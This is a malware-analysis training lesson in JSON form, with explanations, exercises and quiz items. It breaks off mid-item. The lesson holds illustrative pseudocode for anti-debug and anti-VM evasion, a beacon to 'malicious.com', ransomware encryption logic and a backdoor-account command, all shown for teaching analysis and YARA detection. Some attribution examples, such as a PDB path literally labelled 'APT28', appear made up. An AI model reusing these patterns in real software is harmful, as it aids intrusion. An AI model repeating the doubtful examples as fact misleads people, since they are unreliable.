{
  "lesson_id": "c7d8e9f0-1a2b-3c4d-5e6f-7a8b9c0d1e2f",
  "domain": "malware",
  "title": "Advanced Malware Analysis and Reverse Engineering",
  "difficulty": 3,
  "order_index": 5,
  "prerequisites": [
    "f5a6b7c8-9d0e-1f2a-3b4c-5d6e7f8a9b0c"
  ],
  "concepts": [
    "Static Analysis with IDA Pro and Ghidra",
    "Dynamic Analysis and Debugging",
    "Malware Unpacking Techniques",
    "Anti-Analysis and Evasion Techniques",
    "Code Obfuscation Methods",
    "C2 Protocol Analysis",
    "Shellcode Analysis",
    "Ransomware Encryption Analysis",
    "Advanced Persistent Threat (APT) Malware",
    "Malware Attribution Techniques"
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Perform static analysis of malware binaries using disassemblers and decompilers",
    "Debug malware in controlled environments to understand behavior",
    "Unpack and deobfuscate malware to reveal original code",
    "Identify and bypass anti-analysis techniques (anti-debug, anti-VM, anti-sandbox)",
    "Analyze C2 communication protocols and extract IOCs",
    "Reverse engineer ransomware encryption schemes",
    "Attribute malware to threat actor groups based on code artifacts",
    "Create YARA rules and behavioral signatures from malware analysis"
  ],
  "content_blocks": [
    {
      "type": "explanation",
      "title": "Advanced Malware Analysis Fundamentals",
      "content": {
        "text": "Advanced malware analysis combines static and dynamic techniques to fully understand malware behavior, capabilities, and attribution.\n\n**Analysis Workflow**\n\n```\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  MALWARE ANALYSIS WORKFLOW                          \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502  1. Triage (Quick assessment)                       \u2502\n\u2502     - File hash, size, type                         \u2502\n\u2502     - VirusTotal, malware sandboxes                 \u2502\n\u2502     - Strings analysis                              \u2502\n\u2502                                                     \u2502\n\u2502  2. Static Analysis (Without execution)             \u2502\n\u2502     - PE structure analysis                         \u2502\n\u2502     - Import/Export tables                          \u2502\n\u2502     - Disassembly (IDA Pro, Ghidra)                 \u2502\n\u2502     - Decompilation (get pseudo-C code)             \u2502\n\u2502                                                     \u2502\n\u2502  3. Dynamic Analysis (Controlled execution)         \u2502\n\u2502     - Sandbox (Cuckoo, ANY.RUN)                     \u2502\n\u2502     - Debugger (x64dbg, WinDbg)                     \u2502\n\u2502     - API monitoring (Process Monitor)              \u2502\n\u2502     - Network traffic capture (Wireshark)           \u2502\n\u2502                                                     \u2502\n\u2502  4. Advanced Analysis                               \u2502\n\u2502     - Unpacking (reveal original code)              \u2502\n\u2502     - Anti-analysis bypass                          \u2502\n\u2502     - C2 protocol reverse engineering               \u2502\n\u2502     - Encryption algorithm analysis                 \u2502\n\u2502                                                     \u2502\n\u2502  5. Reporting                                       \u2502\n\u2502     - IOCs (hashes, IPs, domains, registry keys)    \u2502\n\u2502     - YARA rules                                    \u2502\n\u2502     - Behavioral signatures                         \u2502\n\u2502     - Attribution (threat actor, family)            \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n```\n\n**Static Analysis Tools**\n\n**1. IDA Pro (Commercial, Industry Standard)**\n- Disassembler (converts binary \u2192 assembly)\n- Decompiler (converts assembly \u2192 pseudo-C)\n- Cross-references (find all calls to a function)\n- Debugging capabilities\n\n**2. Ghidra (Free, NSA Open-Source)**\n- Similar to IDA Pro\n- Excellent decompiler\n- Scriptable (Python, Java)\n- Multi-architecture support\n\n**3. PE Analysis Tools**\n- PEview, CFF Explorer (PE structure)\n- pestudio (detects packers, suspicious imports)\n- Detect It Easy (identifies packers, compilers)\n\n**Reading Assembly Code**\n\nMalware analysts must read x86/x64 assembly:\n\n```asm\n; Simple function in assembly\npush ebp              ; Save base pointer\nmov ebp, esp          ; Set up stack frame\nsub esp, 0x10         ; Allocate 16 bytes local variables\nmov eax, [ebp+8]      ; Get first argument\nadd eax, [ebp+0xC]    ; Add second argument\nmov esp, ebp          ; Restore stack\npop ebp               ; Restore base pointer\nret                   ; Return\n```\n\n**Ghidra decompiles this to:**\n```c\nint add_numbers(int a, int b) {\nreturn a + b;\n}\n```\n\n**Malware Packing**\n\nPackers compress/encrypt malware to evade detection.\n\n**Common Packers:**\n- UPX (Ultimate Packer for eXecutables)\n- Themida (advanced anti-analysis)\n- VMProtect (virtualizes code)\n- Custom packers (APT groups)\n\n**Packed vs Unpacked:**\n```\nPacked malware:\n- Small number of imports (LoadLibrary, GetProcAddress)\n- High entropy (looks random)\n- Strings encrypted\n- Real code hidden\n\nUnpacked malware:\n- Full import table (CreateFile, RegSetValue, etc.)\n- Lower entropy\n- Strings visible\n- Real code exposed\n```\n\n**Unpacking Methods:**\n\n**1. Automated (UPX, etc.):**\n```bash\nupx -d malware.exe  # Decompress UPX-packed file\n```\n\n**2. Manual (Unknown packer):**\n```\n1. Load in debugger (x64dbg)\n2. Set breakpoint on common unpack points:\n- VirtualAlloc (memory allocation for unpacked code)\n- VirtualProtect (change memory to executable)\n- Entry point of unpacked code\n3. Let malware unpack itself in memory\n4. Dump unpacked code from memory\n5. Analyze dumped code\n```\n\n**Anti-Analysis Techniques**\n\nMalware detects analysis environments and behaves differently.\n\n**1. Anti-Debug**\n\n```c\n// IsDebuggerPresent check\nif (IsDebuggerPresent()) {\nExitProcess(0);  // Exit if debugger detected\n}\n\n// PEB (Process Environment Block) check\nif (PEB->BeingDebugged) {\nExitProcess(0);\n}\n\n// Timing check (debuggers are slower)\nstart = GetTickCount();\n// ... execute code ...\nif (GetTickCount() - start > 1000) {\nExitProcess(0);  // Took too long = debugger\n}\n```\n\n**Bypass:** Patch the check (NOP the jump) or use anti-anti-debug plugins.\n\n**2. Anti-VM**\n\n```c\n// Check for VMware artifacts\nif (RegKeyExists(\"HKLM\\\\SOFTWARE\\\\VMware, Inc.\")) {\nExitProcess(0);\n}\n\n// Check for VirtualBox\nif (FileExists(\"C:\\\\Windows\\\\System32\\\\drivers\\\\VBoxMouse.sys\")) {\nExitProcess(0);\n}\n\n// CPUID instruction (VM vendor string)\nchar vendor[13];\ncpuid(vendor);\nif (strcmp(vendor, \"VMwareVMware\") == 0) {\nExitProcess(0);\n}\n```\n\n**Bypass:** Modify VM configuration to hide artifacts, or analyze on bare metal.\n\n**3. Anti-Sandbox**\n\n```c\n// Sleep for long time (sandboxes have time limits)\nSleep(600000);  // 10 minutes\n\n// Check for mouse movement (sandboxes don't simulate)\nPOINT p1, p2;\nGetCursorPos(&p1);\nSleep(5000);\nGetCursorPos(&p2);\nif (p1.x == p2.x && p1.y == p2.y) {\nExitProcess(0);  // No mouse movement = sandbox\n}\n\n// Check number of processes (sandboxes run fewer)\nif (process_count() < 30) {\nExitProcess(0);\n}\n```\n\n**Bypass:** Modify sandbox to simulate user activity.\n\n**C2 Protocol Analysis**\n\nReverse engineering C2 communication reveals:\n- C2 server IPs/domains\n- Communication protocol (HTTP, DNS, custom)\n- Encryption keys\n- Commands supported\n- Data exfiltration methods\n\n**Example - HTTP C2:**\n\n```c\n// Beacon function (calls home to C2)\nvoid beacon() {\nchar* c2_url = \"http://malicious.com/update.php\";\nchar* user_agent = \"Mozilla/5.0 (Windows NT 10.0)\";\n\n// Encrypt victim ID with XOR\nchar victim_id[16];\nget_victim_id(victim_id);  // MAC address hash\nxor_encrypt(victim_id, 0xAB);\n\n// Send beacon\nhttp_post(c2_url, victim_id, user_agent);\n\n// Receive command\nchar* response = get_response();\nxor_decrypt(response, 0xAB);\n\n// Execute command\nif (strcmp(response, \"screenshot\") == 0) {\ntake_screenshot();\n} else if (strcmp(response, \"keylog\") == 0) {\nstart_keylogger();\n}\n}\n```\n\n**Analysis reveals:**\n- C2 domain: malicious.com\n- Encryption: XOR with key 0xAB (weak!)\n- Commands: screenshot, keylog\n- Beacon identifier: hashed MAC address\n\n**Ransomware Analysis**\n\nRansomware analysis focuses on:\n- Encryption algorithm (AES, RSA, ChaCha20)\n- Key generation/storage\n- File targeting (extensions, paths)\n- Ransom note (text, Bitcoin address)\n- Kill switch/decryption flaws\n\n**Example - WannaCry Analysis:**\n\n```c\n// Simplified WannaCry encryption logic\n\nvoid encrypt_files() {\n// Generate AES key for this victim\nBYTE aes_key[32];\nCryptGenRandom(aes_key, 32);\n\n// Encrypt AES key with attacker's RSA public key\nBYTE encrypted_key[256];\nRSA_encrypt(aes_key, attacker_pubkey, encrypted_key);\n\n// Save encrypted key to disk\nwrite_file(\"00000000.eky\", encrypted_key);\n\n// Encrypt each file with AES\nfor (file in all_files) {\nif (is_target_extension(file)) {\nBYTE* plaintext = read_file(file);\nBYTE* ciphertext = AES_encrypt(plaintext, aes_key);\nwrite_file(file + \".WNCRY\", ciphertext);\ndelete_file(file);\n}\n}\n\n// Clear AES key from memory\nmemset(aes_key, 0, 32);\n}\n```\n\n**Analysis findings:**\n- AES-128 encryption (strong)\n- RSA-2048 for key encryption (unbreakable without private key)\n- Key stored in .eky file\n- Target extensions: .doc, .xls, .pdf, .jpg, etc.\n- Vulnerability: Kill switch domain check\n\n**Malware Attribution**\n\nAttribute malware to threat actors based on:\n\n**1. Code Artifacts**\n- Compiler version/settings (MSVC 2010, GCC 4.8)\n- Timestamps (compile time, timezone)\n- Debug strings (PDB paths, developer names)\n- Language (error messages in Russian, Chinese)\n\n**2. Infrastructure**\n- C2 domains (registration details, hosting provider)\n- IP addresses (geolocation, ASN)\n- SSL certificates (issuer, common name)\n\n**3. Tactics, Techniques, Procedures (TTPs)**\n- Unique code patterns\n- Preferred exploits\n- Persistence mechanisms\n- Lateral movement methods\n\n**4. Code Reuse**\n- Shared libraries across samples\n- Identical functions (function fingerprinting)\n- Similar packing/obfuscation\n\n**Example - APT28 Attribution:**\n- PDB path: `Z:\\APT28\\Projects\\XAgent\\Release\\XAgent.pdb`\n- Compile timestamps: Moscow timezone (UTC+3)\n- Target sectors: Government, military, media\n- Infrastructure: Previously seen C2 domains\n- Code similarity: 85% match with known APT28 samples"
      }
    },
    {
      "type": "code_exercise",
      "title": "Hands-On Malware Analysis",
      "content": {
        "text": "**Exercise 1: Static Analysis with Strings**\n\n```bash\n# Extract ASCII/Unicode strings\nstrings -a malware.exe > strings.txt\nstrings -e l malware.exe >> strings.txt  # Unicode\n\n# Analyze strings\ngrep -i \"http\" strings.txt  # URLs\ngrep -i \"key\" strings.txt   # Crypto keys\ngrep -i \"SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\" strings.txt  # Registry\n\n# Common indicators:\n# - C2 URLs: http://malicious.com/update.php\n# - Ransom notes: \"Your files have been encrypted\"\n# - API names: CreateRemoteThread, WriteProcessMemory\n# - File paths: C:\\\\Users\\\\Public\\\\malware.dll\n```\n\n**Exercise 2: PE Analysis**\n\n```python\n# Python script using pefile library\nimport pefile\nimport hashlib\n\npe = pefile.PE('malware.exe')\n\n# Basic info\nprint(f\"Compile Time: {pe.FILE_HEADER.dump_dict()['TimeDateStamp']['Value']}\")\nprint(f\"Entry Point: 0x{pe.OPTIONAL_HEADER.AddressOfEntryPoint:08x}\")\n\n# Check for packer (high entropy = packed)\nentropy = pe.sections[0].get_entropy()\nif entropy > 7.0:\nprint(\"\u26a0\ufe0f  HIGH ENTROPY - Likely PACKED\")\n\n# Import table analysis\nprint(\"\\nImports:\")\nfor entry in pe.DIRECTORY_ENTRY_IMPORT:\nprint(f\"  {entry.dll.decode()}\")\nfor imp in entry.imports:\nif imp.name:\nprint(f\"    - {imp.name.decode()}\")\n\n# Suspicious imports\nsuspicious = ['VirtualAlloc', 'WriteProcessMemory', 'CreateRemoteThread', \n'WinExec', 'ShellExecute', 'RegSetValue']\nfor entry in pe.DIRECTORY_ENTRY_IMPORT:\nfor imp in entry.imports:\nif imp.name and imp.name.decode() in suspicious:\nprint(f\"\u26a0\ufe0f  SUSPICIOUS: {imp.name.decode()}\")\n\n# Hash calculation\nwith open('malware.exe', 'rb') as f:\ndata = f.read()\nprint(f\"\\nMD5: {hashlib.md5(data).hexdigest()}\")\nprint(f\"SHA256: {hashlib.sha256(data).hexdigest()}\")\n```\n\n**Exercise 3: Unpacking with x64dbg**\n\n```\n1. Load malware.exe in x64dbg\n\n2. Set breakpoints on common unpack points:\n- VirtualAlloc (allocate memory for unpacked code)\n- VirtualProtect (make memory executable)\n- Entry point after unpacking\n\n3. Run to breakpoint:\nBP VirtualAlloc\nF9 (Run)\n\n4. When stopped, examine allocated memory:\n- Right-click EAX (return value = allocated address)\n- Follow in Dump\n- Look for PE header (4D 5A)\n\n5. Set hardware breakpoint on allocated memory:\n- Right-click in dump\n- Breakpoint \u2192 Hardware, Execute\n\n6. Continue execution (F9)\n- Breaks when unpacked code executes\n\n7. Dump unpacked code:\n- Plugins \u2192 Scylla\n- IAT Autosearch\n- Get Imports\n- Dump\n- Fix Dump\n\n8. Analyze unpacked code in IDA/Ghidra\n```\n\n**Exercise 4: Dynamic Analysis with Process Monitor**\n\n```\n1. Configure Process Monitor filters:\n- Process Name: malware.exe\n- Operation: RegSetValue, CreateFile, WriteFile, Process Create\n\n2. Clear existing events (Ctrl+X)\n\n3. Execute malware in sandbox\n\n4. Analyze activity:\n\nRegistry modifications:\n- HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware\n\u2192 C:\\Users\\Public\\malware.exe\n\u2192 PERSISTENCE\n\nFile system:\n- C:\\Users\\Public\\malware.dll (dropped file)\n- C:\\Users\\[user]\\Documents\\*.docx.encrypted (ransomware)\n\nProcess creation:\n- malware.exe \u2192 cmd.exe \u2192 net.exe user hacker Password123 /add\n\u2192 BACKDOOR ACCOUNT\n\nNetwork:\n- TCP Connect: 192.0.2.100:443 (C2 server)\n\n5. Extract IOCs:\n- Registry keys, file paths, network connections\n```\n\n**Exercise 5: C2 Traffic Analysis with Wireshark**\n\n```\n1. Capture traffic during malware execution\n\n2. Filter HTTP traffic:\nhttp\n\n3. Analyze beacon:\nPOST /update.php HTTP/1.1\nHost: malicious.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0)\nContent-Length: 32\n\n[Encrypted data: e4 a2 b5 c1 ...]\n\n4. Identify encryption:\n- Extract data: e4 a2 b5 c1 d8 3f 2a ...\n- Analyze in CyberChef or Python\n\n5. Attempt decryption:\n# Try XOR with common keys\nfor key in range(256):\ndecrypted = xor(data, key)\nif is_printable(decrypted):\nprint(f\"Key: {key:02x}, Data: {decrypted}\")\n\n# Output:\n# Key: ab, Data: victim_id=AA:BB:CC:DD:EE:FF\n\n6. Analyze C2 response:\nHTTP/1.1 200 OK\nContent-Length: 16\n\n[Encrypted command]\n\n# Decrypt with same XOR key:\nCommand: screenshot\n\n7. Document C2 protocol:\n- Domain: malicious.com\n- Encryption: XOR 0xAB\n- Commands: screenshot, keylog, exfiltrate\n```\n\n**Exercise 6: Create YARA Rule from Analysis**\n\n```yara\n// Based on analysis findings\nrule Malware_XORRat_2024 {\nmeta:\ndescription = \"Detects XORRat malware family\"\nauthor = \"Analyst\"\ndate = \"2024-01-15\"\nhash = \"sha256:abc123...\"\n\nstrings:\n// C2 communication\n$url = \"malicious.com/update.php\" ascii\n$ua = \"Mozilla/5.0 (Windows NT 10.0)\" ascii\n\n// Encryption routine (XOR 0xAB)\n$xor_routine = {\n8A 0?        // mov cl, [reg]\n80 F1 AB     // xor cl, 0xAB\n88 0?        // mov [reg], cl\n}\n\n// Commands\n$cmd1 = \"screenshot\" ascii\n$cmd2 = \"keylog\" ascii\n$cmd3 = \"exfiltrate\" ascii\n\n// Persistence registry key\n$persist = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" wide\n\ncondition:\nuint16(0) == 0x5A4D and  // PE file (MZ header)\n(\n($url and $ua) or\n($xor_routine and any of ($cmd*)) or\n(3 of ($cmd*, $persist))\n)\n}\n```\n\n**Test YARA rule:**\n```bash\nyara -r xorrat.yar /path/to/samples/\n```"
      }
    },
    {
      "type": "real_world",
      "title": "Real-World Malware Analysis Cases",
      "content": {
        "text": "**Stuxnet (2010) - Most Complex Malware Ever**\n\n**Analysis Findings:**\n- 4 zero-day exploits (Windows, Siemens SCADA)\n- Rootkit (kernel driver, signed with stolen certificates)\n- Self-replicating worm (USB, network shares)\n- PLC (Programmable Logic Controller) payload\n- Target: Iranian nuclear centrifuges\n\n**Key Analysis Techniques:**\n- Static analysis revealed 4,000+ functions\n- Decompilation showed PLC communication code\n- Dynamic analysis in SCADA simulator revealed centrifuge manipulation\n- Attribution: Code artifacts, compile timestamps, Hebrew strings\n\n**WannaCry (2017) - Global Ransomware Pandemic**\n\n**Analysis Findings:**\n- EternalBlue exploit (NSA leak)\n- SMB worm (self-propagating)\n- AES-128 + RSA-2048 encryption\n- Kill switch domain: iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com\n\n**Critical Discovery:**\nMalware analyst Marcus Hutchins found kill switch:\n\n```c\nif (domain_exists(\"iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com\")) {\nExitProcess(0);  // Stop spreading\n}\n```\n\nRegistering the domain stopped the outbreak.\n\n**NotPetya (2017) - $10 Billion Wiper**\n\n**Analysis Findings:**\n- Disguised as ransomware (actually wiper)\n- Credential dumping (Mimikatz)\n- Lateral movement (PsExec, WMIC, SMB)\n- MBR overwrite (unrecoverable)\n- No real decryption key (ransom was fake)\n\n**Attribution:**\n- Supply chain attack via Ukrainian accounting software (M.E.Doc)\n- Code artifacts linked to Russian APT (Sandworm/TeleBots)\n- Timing coincided with Ukrainian holiday"
      }
    },
    {
      "type": "reflection",
      "title": "Malware Analysis Mastery",
      "content": {
        "text": "**Critical Questions:**\n\n1. What's the difference between static and dynamic analysis?\n2. Why do malware authors use packers?\n3. How do anti-debug techniques work, and how can you bypass them?\n4. What makes ransomware encryption unbreakable (in most cases)?\n5. How do analysts attribute malware to specific threat actors?\n6. Why is assembly language knowledge critical for malware analysis?\n\n**Career Application:**\n- Malware analysts earn $90,000-$140,000 average\n- GREM (GIAC Reverse Engineering Malware) certification\n- High demand in SOCs, incident response teams, threat intelligence\n- Skills apply to exploit development, vulnerability research\n\n**Hands-On Challenge:**\n1. Download malware samples from theZoo or malware bazaar\n2. Analyze in isolated VM (NEVER on host!)\n3. Create full analysis report with IOCs and YARA rules\n4. Practice until you can analyze a sample in under 2 hours"
      }
    },
    {
      "type": "memory_aid",
      "title": "Malware Analysis Quick Reference",
      "content": {
        "text": "**Analysis Workflow: \"TSDAR\"**\n- **T**riage (hash, strings, VirusTotal)\n- **S**tatic (PE analysis, disassembly)\n- **D**ynamic (sandbox, debugger)\n- **A**dvanced (unpack, C2 analysis)\n- **R**eport (IOCs, YARA, attribution)\n\n**Suspicious PE Imports: \"VWCRS\"**\n- **V**irtualAlloc (memory allocation)\n- **W**riteProcessMemory (process injection)\n- **C**reateRemoteThread (process injection)\n- **R**egSetValue (persistence)\n- **S**hellExecute (command execution)\n\n**Anti-Analysis Detection: \"DVS\"**\n- **D**ebugger (IsDebuggerPresent, timing)\n- **V**M (artifacts, CPUID)\n- **S**andbox (mouse, sleep, process count)\n\n**Common Packers:**\n```\nUPX - upx -d malware.exe\nThemida - Manual unpacking required\nVMProtect - Code virtualization (very hard)\n```\n\n**x64dbg Unpacking Breakpoints:**\n```\nBP VirtualAlloc\nBP VirtualProtect\nBP CreateThread\n```\n\n**YARA Rule Template:**\n```yara\nrule MalwareName {\nmeta:\ndescription = \"Description\"\nstrings:\n$s1 = \"string\" ascii\n$hex = {4D 5A 90 00}\ncondition:\nuint16(0) == 0x5A4D and any of them\n}\n```\n\n**Quick Entropy Check (Python):**\n```python\nimport math\nfrom collections import Counter\n\ndef entropy(data):\np = [c/len(data) for c in Counter(data).values()]\nreturn -sum(i * math.log2(i) for i in p)\n\n# entropy > 7.0 = likely packed\n```"
      }
    },
    {
      "type": "video",
      "title": "Malware Analysis Resources",
      "content": {
        "resources": "**Featured Video**: [Getting Started in Cybersecurity + Reverse Engineering #malware](https://www.youtube.com/watch?v=5R6VsiLZP9U)\n\n**Training:**\n- SANS FOR610: Reverse-Engineering Malware\n- SANS FOR710: Reverse-Engineering Malware (Advanced)\n- Practical Malware Analysis (book + labs)\n\n**Certifications:**\n- GREM: GIAC Reverse Engineering Malware\n- eLearnSecurity eMAPT (Malware Analysis Professional)\n\n**YouTube:**\n- \"OALabs\" (excellent malware unpacking tutorials)\n- \"MalwareTech\" (Marcus Hutchins - WannaCry discoverer)\n- \"13Cubed\" (malware analysis, forensics)\n- \"John Hammond\" (CTF malware challenges)\n\n**Practice:**\n- Malware Traffic Analysis (malware-traffic-analysis.net)\n- theZoo (GitHub malware samples - USE WITH CAUTION)\n- Malware Bazaar (abuse.ch)\n- Crackmes.one (reverse engineering practice)\n\n**Tools:**\n- IDA Pro (commercial) or Ghidra (free)\n- x64dbg (debugger)\n- Cuckoo Sandbox (automated analysis)\n- Remnux (Linux distro for malware analysis)\n- FLARE VM (Windows malware analysis VM)\n\n**Books:**\n- \"Practical Malware Analysis\" (Sikorski, Honig)\n- \"The IDA Pro Book\" (Chris Eagle)\n- \"Rootkits and Bootkits\" (Matrosov et al.)"
      }
    }
  ],
  "post_assessment": [
    {
      "question": "You analyze a binary with high entropy (7.8) and only 3 imports: LoadLibraryA, GetProcAddress, VirtualProtect. What does this indicate?",
      "options": [
        "Legitimate software with good coding practices",
        "Packed malware (packer hides real imports)",
        "Corrupted or incomplete binary",
        "Malware that doesn't use Windows API"
      ],
      "correct_answer": 1,
      "explanation": "**Correct: Packed malware.**\n\n**Indicators:**\n\n1. **High entropy (7.8)**: Entropy measures randomness. High entropy means data looks random (encrypted/compressed). Normal executables: 5-6. Packed malware: 7-8.\n\n2. **Minimal imports**: Packers hide the real import table. Only imports needed for unpacking remain:\n   - `LoadLibraryA` - Load DLLs at runtime\n   - `GetProcAddress` - Get function addresses dynamically\n   - `VirtualProtect` - Change memory permissions (make unpacked code executable)\n\n**How Packing Works:**\n```\nNormal malware imports:\n- CreateFile, WriteFile (file operations)\n- RegSetValue (persistence)\n- HttpSendRequest (C2 communication)\n- 100+ functions visible\n\nPacked malware:\n1. Real code is compressed/encrypted\n2. Small unpacker stub loads first\n3. Unpacker uses LoadLibrary/GetProcAddress to resolve real functions\n4. Real imports hidden until runtime\n```\n\n**Detection:**\n```bash\nDetect It Easy malware.exe\n# Output: UPX 3.96 detected\n\npestudio malware.exe\n# Indicators:\n# - Entropy: 7.8 (HIGH)\n# - Imports: 3 (SUSPICIOUS)\n# - Overlay: 95% of file (packer)\n```\n\n**Why other options are wrong:**\n- Legitimate software has many imports and lower entropy\n- Corrupted binaries won't have valid PE structure\n- All Windows malware uses API (hidden during packing)",
      "question_id": "dc654852-18dd-4d58-a147-9b5bedc14c99",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question": "During debugging, malware checks if (GetTickCount() - start_time > 100). If true, it exits. What anti-analysis technique is this?",
      "options": [
        "Anti-VM detection",
        "Anti-debug timing check",
        "Anti-sandbox delay",
        "Code obfuscation"
      ],
      "correct_answer": 1,
      "explanation": "**Correct: Anti-debug timing check.**\n\n**How It Works:**\n```c\nDWORD start = GetTickCount();\n\n// Execute single instruction\n__asm { nop }\n\nDWORD end = GetTickCount();\n\nif (end - start > 100) {\n    // 100ms for NOP?! Debugger detected!\n    ExitProcess(0);\n}\n```\n\n**Why debuggers are slower:**\n- Debugger pauses execution at each step\n- Analyst examines registers, memory\n- Single instruction takes seconds (not milliseconds)\n\n**Normal execution:**\n- NOP takes <1ms\n- Time delta: ~0-5ms\n\n**With debugger:**\n- Analyst steps through code\n- Time delta: 1000+ms\n- Triggers anti-debug check\n\n**Bypass Methods:**\n\n**1. Patch the check:**\n```asm\n; Original:\ncmp eax, 100     ; Compare time delta to 100\njg exit_process  ; Jump if greater (debugger detected)\n\n; Patched:\ncmp eax, 100\nnop              ; Replace JG with NOP (never jumps)\nnop\n```\n\n**2. Modify return value:**\n```\n1. Set breakpoint after GetTickCount()\n2. Manually set EAX register to small value\n3. Continue execution\n```\n\n**3. Use anti-anti-debug plugins:**\n- ScyllaHide (x64dbg plugin)\n- Automatically handles timing checks\n\n**Why other options are wrong:**\n- Anti-VM: Checks for VMware/VirtualBox artifacts, not timing\n- Anti-sandbox: Usually checks for mouse movement, file count\n- Obfuscation: Makes code hard to read, not timing-based",
      "question_id": "94230c4c-127d-4983-924d-dde91705cafc",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question": "Ransomware uses AES-256 to encrypt files, then encrypts the AES key with RSA-2048. The victim has encrypted files and the encrypted AES key. Can they decrypt without the attacker's RSA private key?",
      "options": [
        "Yes, AES-256 can be brute-forced in weeks",
        "Yes, by analyzing memory for the AES key",
        "No, RSA-2048 is unbreakable with current technology",
        "Yes, by reversing the encryption algorithm"
      ],
      "correct_answer": 2,
      "explanation": "**Correct: No, RSA-2048 is unbreakable with current technology.**\n\n**Ransomware Encryption Flow:**\n```\n1. Malware generates random AES-256 key (32 bytes)\n2. Encrypts victim's files with AES key:\n   file.docx \u2192 AES-256 encrypt \u2192 file.docx.encrypted\n3. Encrypts AES key with attacker's RSA-2048 PUBLIC key:\n   AES-key \u2192 RSA encrypt \u2192 encrypted_key.dat\n4. Deletes original AES key from disk\n5. Victim has:\n   - Encrypted files \u2713\n   - Encrypted AES key \u2713\n   - NO way to decrypt without RSA private key \u2717\n```\n\n**Why Each Option is Wrong/Right:**\n\n**AES-256 brute force:**\n- 2^256 possible keys = 115,792,089,237,316,195,423,570,985,008,687,907,853,269,984,665,640,564,039,457,584,007,913,129,639,936 keys\n- Testing 1 trillion keys/second = would take longer than age of universe\n- IMPOSSIBLE\n\n**Memory analysis:**\n- Possible IF AES key still in memory\n- Most ransomware securely wipes key: `memset(aes_key, 0, 32)`\n- Even if found in memory: only works if analyzed IMMEDIATELY after encryption\n- RARELY works\n\n**RSA-2048 security:**\n- Breaking RSA-2048 requires factoring 2048-bit number\n- Best known algorithm: General Number Field Sieve\n- Estimated time: millions of years with current computers\n- UNBREAKABLE (for now - quantum computers might change this)\n\n**Reversing algorithm:**\n- AES and RSA are public algorithms\n- Security comes from KEY, not algorithm\n- Knowing the algorithm doesn't help without the key\n- DOESN'T HELP\n\n**Real-World Recovery Options:**\n\n1. **Backups** (restore from backup)\n2. **Flawed implementation** (malware bugs):\n   - WannaCry: Prime number generation flaw (didn't work)\n   - Some ransomware: Used same key for all victims\n   - Some ransomware: Stored key in registry/file\n3. **Law enforcement decryption** (if private key seized)\n4. **Shadow copies** (Windows VSS if not deleted)\n\n**Key Lesson:**\nProperly implemented crypto (AES + RSA) is UNBREAKABLE. Prevention (backups, security controls) is the only defense.",
      "question_id": "187e611a-e668-46f7-9ae9-7455d5c466c7",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question": "You find malware with PDB path: 'C:\\Users\\Dev\\Projects\\Backdoor\\Release\\backdoor.pdb'. What does this reveal?",
      "options": [
        "Nothing useful (PDB paths are always fake)",
        "Developer username 'Dev' and project structure (attribution artifact)",
        "The malware source code location on victim machine",
        "A decoy to mislead analysts"
      ],
      "correct_answer": 1,
      "explanation": "**Correct: Developer username and project structure (attribution artifact).**\n\n**What is PDB?**\n\nPDB (Program Database) is a debug symbol file created by Microsoft Visual Studio:\n\n```\nDuring compilation:\nSource code (backdoor.cpp) \n  \u2193 Compile with /Zi flag\nExecutable (backdoor.exe) + PDB file (backdoor.pdb)\n```\n\nPDB contains:\n- Source file paths\n- Function names\n- Variable names\n- Line numbers\n\n**Release builds** should NOT include PDBs, but developers often forget to remove the PDB path embedded in the executable.\n\n**What PDB Paths Reveal:**\n\n```\nPDB Path: C:\\Users\\Dev\\Projects\\Backdoor\\Release\\backdoor.pdb\n\nIntelligence:\n- Developer username: \"Dev\"\n- Project name: \"Backdoor\" (not hiding intent!)\n- Development OS: Windows\n- Compiler: Visual Studio (PDB is MSVC-specific)\n- Build type: Release\n```\n\n**Real-World Examples:**\n\n**APT28 (Fancy Bear):**\n```\nPDB: Z:\\APT28\\Projects\\XAgent\\Release\\XAgent.pdb\n\nReveals:\n- Project clearly labeled \"APT28\"\n- Tool name: \"XAgent\"\n- Network drive: Z:\\ (shared development environment)\n```\n\n**Chinese APT (APT17):**\n```\nPDB: C:\\Users\\user\\Documents\\Visual Studio 2010\\Projects\\\u65b0\u5efa\u6587\u4ef6\u5939\\Release\\client.pdb\n\nReveals:\n- Visual Studio 2010\n- Chinese characters: \u65b0\u5efa\u6587\u4ef6\u5939 (\"New Folder\")\n- Attribution: Chinese-speaking developer\n```\n\n**Lazarus Group (North Korea):**\n```\nPDB: D:\\HighSchool\\version 13\\2ndrelease\\AIScanner\\Release\\AIScanner.pdb\n\nReveals:\n- Project folder: \"HighSchool\" 